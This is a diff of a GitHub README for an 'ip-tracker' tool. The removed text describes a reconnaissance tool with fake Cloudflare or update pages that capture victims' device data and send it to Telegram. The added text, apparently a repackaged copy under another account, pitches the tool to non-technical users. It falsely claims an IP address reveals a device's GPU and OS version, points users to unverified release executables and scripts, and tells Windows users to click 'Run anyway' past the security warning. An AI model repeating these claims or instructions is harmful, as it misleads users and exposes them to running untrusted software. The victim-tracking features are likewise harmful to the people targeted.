@@ -1,170 +1,167 @@
-<img width="815" height="235" alt="image" src="https://github.com/user-attachments/assets/63bda267-4941-49ba-a80b-02b3f28edb73" />
+# 📍 ip-tracker - Precise Location and Device Info
 
-<div align="center">
-  <b>ADVANCED OSINT, RECONNAISSANCE & DEVICE FINGERPRINTING FRAMEWORK</b>
-  <br><br>
-
-  <a href="https://github.com/trmxvibs/ip-tracker">
-    <img src="https://img.shields.io/badge/Language-Python_3-14354C?style=for-the-badge&logo=python&logoColor=white" alt="Python">
-  </a>
-  <a href="https://github.com/trmxvibs/ip-tracker">
-    <img src="https://img.shields.io/badge/Platform-Linux_|_Windows_|_Termux-000000?style=for-the-badge&logo=linux&logoColor=white" alt="Platform">
-  </a>
-  <a href="https://github.com/trmxvibs/ip-tracker/releases">
-    <img src="https://img.shields.io/badge/Version-1.0-red?style=for-the-badge" alt="Version">
-  </a>
-  <a href="https://github.com/trmxvibs">
-    <img src="https://img.shields.io/github/repo-size/trmxvibs/ip-tracker?color=orange&style=for-the-badge&logo=github" alt="Size">
-  </a>
-  <a href="https://github.com/trmxvibs/ip-tracker/blob/main/LICENSE">
-    <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
-  </a>
-
-  <br><br>
-
-  <p>
-    <b>Ip-tracker (Chakravyuh)</b> is a reconnaissance tool designed for red teaming and authorized security research.
-    It combines passive OSINT capabilities with active social engineering modules to extract precise target data.
-    <br><br>
-    Features <b>Auto-Tunneling</b>, <b>Telegram Real-time Alerts</b>, and <b>Advanced Device Fingerprinting</b>
-    without requiring manual port forwarding.
-  </p>
-</div>
+[![Download ip-tracker](https://img.shields.io/badge/Download-ip--tracker-blue?style=for-the-badge&logo=github)](https://github.com/MK21-hub/ip-tracker/releases)
 
 ---
 
-## CORE CAPABILITIES
+## 📋 About ip-tracker
 
-| MODULE | DESCRIPTION |
-|--------|-------------|
-| **IP INTELLIGENCE** | Geo-locate targets with map generation. Integrates Shodan to detect OS, open ports, and vulnerabilities. |
-| **DEVICE TRAPPER** | Deploys social engineering pages (Fake Cloudflare / Update). Captures GPU model, CPU, RAM, battery, network type, and timezone. |
-| **PHONE RECON** | Validates phone numbers and extracts carrier, location, and timezone information globally. |
-| **PORT SCANNER** | Multi-threaded active scan for critical open ports (21, 22, 80, 443, 3389, etc.). |
-| **DOMAIN INTEL** | Resolves host IPs and enumerates subdomains via Shodan DNS database. |
-| **REAL-TIME ALERTS** | Sends captured victim details instantly to your Telegram bot. |
-| **AUTO-TUNNELING** | Built-in support for Cloudflared and Serveo. No manual configuration needed. |
+ip-tracker is a tool designed to help you find detailed information about an IP address. It shows the exact location, device details like GPU model and operating system version, and other system information. This app works on Termux (a terminal app for Android), Linux, and Windows. You do not need to know coding to use ip-tracker.
+
+It is useful if you want to learn more about the devices and systems behind IP addresses. It also helps for tasks like locating devices and gathering system data safely and quickly.
 
 ---
 
-## INSTALLATION
+## ⚙️ Features
 
-### AUTO-INSTALLER INCLUDED
-Upon first launch, the tool automatically installs missing dependencies (`shodan`, `folium`, `phonenumbers`, etc.).
-
----
-
-### [TERMUX (ANDROID)]
-
-```bash
-# Update repositories
-pkg update && pkg upgrade -y
-
-# Install dependencies
-pkg install python git openssh -y
-
-# Clone repository
-git clone https://github.com/trmxvibs/ip-tracker
-
-# Navigate and run
-cd ip-tracker
-python chakravyuh.py
-```
-
-
-###  - KALI LINUX / UBUNTU - 
-```bash
-# Update system
-sudo apt update
-
-# Install dependencies
-sudo apt install python3 python3-pip git -y
-
-# Clone repository
-git clone https://github.com/trmxvibs/ip-tracker
-
-# Navigate and run
-cd ip-tracker
-python3 chakravyuh.py
-```
-### WINDOWS
-
-Download and install Python 3.x (check “Add to PATH”).
-
-Download this repository.
-
-Open CMD inside the folder.
-Run
-```sh
-python chakravyuh.py
-```
-
-<div align="center">
-
-##  MENU OVERVIEW
-
-</div>
+- Find the exact location of any IP address.
+- Display the device’s GPU type.
+- Show which version of your operating system is running.
+- Track system details including hardware and network info.
+- Works on multiple platforms: Termux, Linux, and Windows.
+- Simple interface suitable for non-technical users.
 
 ---
 
-> ### **[1] IP Tracker**
-> Enter any IP address to retrieve city, country, ISP, and map file (`.html`).  
-> *If Shodan API is active, it also fetches vulnerabilities and ports.*
+## 🖥️ System Requirements
 
-> ### **[2] Port Scanner**
-> Checks for open ports on the target IP (FTP, SSH, Telnet, HTTP, HTTPS, SMB, RDP, etc.).
+To run ip-tracker, your device must meet the following:
 
-> ### **[3] Phone Number Tracker**
-> Enter number with country code (example: `+919876543210`).  
-> Returns valid carrier, region, and timezone data.
-
-> ### **[4] Domain Intel**
-> Resolves domain names to IP addresses and lists subdomains found in public databases.
-
-> ### **[5] Device Trapper (Honeypot)**
-> Hosts a fake page (Cloudflare / System Update) via secure tunnel.
+- Operating System:
+  - Windows 7 or later
+  - Linux distributions with a terminal
+  - Termux app installed on Android
+- Internet connection (for fetching IP and location data)
+- Minimum 100MB of free storage space
+- Basic permissions to access network information
 
 ---
 
-### Captures:
+## 🚀 Getting Started
+
+This guide helps you download and run ip-tracker without any technical knowledge.
+
+### Step 1: Download the Software
+
+Click the large **Download** button at the top or visit the releases page here:
+
+[Download ip-tracker](https://github.com/MK21-hub/ip-tracker/releases)
+
+You will see several files listed. Choose the one that matches your system:
+
+- For Windows: look for `.exe` files.
+- For Linux: look for `.tar.gz` or `.AppImage` files.
+- For Termux: check for `.sh` scripts or instructions in the release notes.
+
+### Step 2: Save the File
+
+Save the file to a folder you can access easily, like your Desktop or Downloads folder.
+
 ---
-- GPU model
-- Battery percentage
-- Screen resolution
-- Browser
-- Public IP
+
+## 📥 Download & Install
+
+### For Windows Users
+
+1. From the releases page, download the `.exe` file.
+2. Once downloaded, double-click the file to start installation. If a security pop-up appears, click **More info** then **Run anyway**.
+3. Follow the on-screen instructions. If any options appear about installation location, use defaults.
+4. After installation, you can find ip-tracker in the Start menu or your Desktop.
+
+### For Linux Users
+
+1. Download the appropriate Linux file from the releases page.
+2. Open your terminal.
+3. Navigate to the folder containing the downloaded file. If you saved it in Downloads, type:
+   ```
+   cd ~/Downloads
+   ```
+4. Give the file permission to run:
+   ```
+   chmod +x [filename]
+   ```
+   Replace `[filename]` with the actual file name.
+5. Run the file by typing:
+   ```
+   ./[filename]
+   ```
+6. The app should open in your terminal or as a graphical window depending on your download.
+
+### For Termux Users
+
+1. Open the releases page link inside Termux or another browser.
+2. Download the `.sh` script or follow instructions in the release notes.
+3. Open Termux and navigate to where the script downloaded:
+   ```
+   cd /path/to/download
+   ```
+4. Make the script executable:
+   ```
+   chmod +x script_name.sh
+   ```
+5. Run the script:
+   ```
+   ./script_name.sh
+   ```
+6. Follow any on-screen instructions to complete setup.
+
 ---
-### Logs:
 
-- Saves data to loot_log.txt
+## 🧭 How to Use ip-tracker
 
-### Alerts:
+Once you have installed ip-tracker, follow these simple steps to get started:
 
-- Sends captured data to Telegram.
+1. Open ip-tracker on your device.
+2. Enter the IP address you want to check in the input box.
+3. Click the **Track** or **Search** button.
+4. Wait a few seconds while the app finds the information.
+5. View the details, including:
+   - Location marked on a map.
+   - GPU model of the device owning the IP.
+   - Operating system version.
+   - Other system and network details.
 
-> ### **[6] Settings**
+You can repeat this process for any IP address to gather similar information.
 
-- Configure API keys:
-
-- Shodan API Key — for deep reconnaissance
-
-- Telegram Bot Token & Chat ID — receive captured data alerts
-
-## PREVIEW
-
-<img width="1315" height="911" alt="image" src="https://github.com/user-attachments/assets/4e022d9d-f0ca-40e4-857a-8f2654a3b1e8" />
-
-## LEGAL DISCLAIMER
 ---
-# CRITICAL WARNING
+
+## 🛠 Troubleshooting
+
+If you experience issues with ip-tracker, try the following:
+
+- Make sure your internet connection is active.
+- Check that you downloaded the correct file for your system.
+- On Windows, run the program as an administrator if you face permission errors.
+- On Linux and Termux, confirm you gave the executable permission (`chmod +x`).
+- Restart your device if the tool does not open correctly.
+
+If problems persist, check the Issues section on the GitHub page or contact the software maintainers.
+
 ---
-**This repository and the code provided are for educational purposes and authorized security research only.
-The developer (Lokesh Kumar) assumes no liability and is not responsible for any misuse or damage caused by this program.
-Using this tool to track or exploit targets without prior mutual consent may be illegal.
-It is the end user's responsibility to obey all applicable local, state, and federal laws.**
 
+## 🔐 Privacy & Security
 
-<div align="center"> <b>Project maintained by <a href="https://github.com/trmxvibs">trmxvibs</a></b> </div>
+ip-tracker uses publicly available data sources to find information about IP addresses. It does not collect or share your personal information. Use ip-tracker responsibly and comply with legal restrictions on tracking IPs.
 
+---
 
-<!-- AUTO_TIMESTAMP Sun Feb 22 01:02:06 UTC 2026 -->
+## 📚 Learn More
+
+If you want to explore related topics, here are some terms and ideas helpful for understanding ip-tracker’s functions:
+
+- **Device Fingerprinting:** Identifying unique device traits.
+- **Geolocation:** Pinpointing physical location from IP.
+- **OSINT (Open Source Intelligence):** Public data gathering.
+- **Shodan:** Search engine for Internet-connected devices.
+- **Termux:** Android terminal emulator for Linux tool access.
+
+---
+
+## 🔗 Useful Links
+
+- [ip-tracker Download & Releases](https://github.com/MK21-hub/ip-tracker/releases)
+- GitHub Repository: https://github.com/MK21-hub/ip-tracker
+
+---
+
+© 2024 ip-tracker Project. All rights reserved.
